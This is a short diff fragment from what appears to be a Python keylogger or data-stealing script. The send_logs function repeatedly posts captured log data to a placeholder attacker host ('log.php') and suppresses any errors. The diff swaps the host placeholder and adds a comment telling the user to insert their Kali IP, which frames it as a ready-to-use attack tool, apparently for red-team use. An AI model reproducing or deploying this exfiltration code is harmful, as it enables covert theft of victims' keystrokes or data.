@@ -76,7 +76,7 @@ def send_logs():
     while True:
         if log.strip():
             try:
-                requests.post("http://[RedTeam_Local_IP]/log.php", data=log)
+                requests.post("http://[Attacker_local_IP]/log.php", data=log) # MAKE SURE YOU CHANGE TO YOUR KALI IP
                 log = ""  # Clear after sending
             except:
                 pass
